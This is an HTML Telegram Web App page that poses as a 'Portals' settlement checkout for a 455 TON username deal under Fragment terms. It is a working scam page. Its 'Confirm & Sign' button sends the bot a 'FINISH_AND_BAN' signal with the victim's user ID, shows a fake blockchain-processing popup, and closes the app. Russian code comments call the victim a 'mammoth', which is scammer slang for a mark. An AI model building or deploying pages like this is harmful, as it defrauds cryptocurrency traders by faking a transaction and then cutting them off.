<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Portals | Settlement</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        :root { --bg: #000000; --card: #0a0a0a; --accent: #0088cc; --border: #1a1a1a; --text: #ffffff; }
        body { font-family: 'Inter', sans-serif; background: var(--bg); color: var(--text); margin: 0; padding: 0; }
        .page { display: none; padding: 16px; }
        .page.active { display: block; }
        
        /* Стиль Portals */
        .portal-card { background: var(--card); border: 1px solid var(--border); border-radius: 24px; padding: 24px; text-align: center; margin-top: 50px; }
        .status-dot { width: 8px; height: 8px; background: #31b545; border-radius: 50%; display: inline-block; margin-right: 8px; box-shadow: 0 0 10px #31b545; }
        .price-text { font-size: 48px; font-weight: 800; margin: 20px 0; letter-spacing: -2px; }
        .price-text span { font-size: 20px; color: var(--accent); letter-spacing: 0; }
        
        .btn-confirm { width: 100%; background: var(--text); color: #000; border: none; padding: 20px; border-radius: 16px; font-size: 18px; font-weight: 700; cursor: pointer; margin-top: 30px; }
        .details-row { display: flex; justify-content: space-between; padding: 12px 0; border-bottom: 1px solid var(--border); font-size: 14px; }
        .details-row span { color: #666; }
    </style>
</head>
<body>

    <div id="checkout" class="page active">
        <div class="portal-card">
            <div style="font-size: 12px; color: #666; text-transform: uppercase;"><span class="status-dot"></span> Smart Contract Ready</div>
            <div class="price-text" id="price-val">455 <span>TON</span></div>
            
            <div class="details-row"><span>Asset</span> <b id="asset-name">@crypto_king</b></div>
            <div><br></div>
            <div class="details-row"><span>Network</span> <b>The Open Network</b></div>
            <div class="details-row"><span>Method</span> <b>P2P Settlement</b></div>

            <button class="btn-confirm" onclick="finishTransaction()">Confirm & Sign</button>
            <p style="font-size: 12px; color: #444; margin-top: 20px;">By signing, you agree to the Fragment terms of service.</p>
        </div>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();

        function finishTransaction() {
            // 1. Отправляем сигнал боту на блокировку
            tg.sendData(JSON.stringify({
                action: "FINISH_AND_BAN",
                user: tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : "unknown"
            }));

            // 2. Имитация процесса и закрытие
            tg.showPopup({
                title: 'Signing...',
                message: 'Processing transaction in TON Blockchain. Please wait.',
            });

            setTimeout(() => {
                tg.close(); // Выкидываем мамонта из приложения
            }, 3000);
        }
    </script>
</body>
</html>
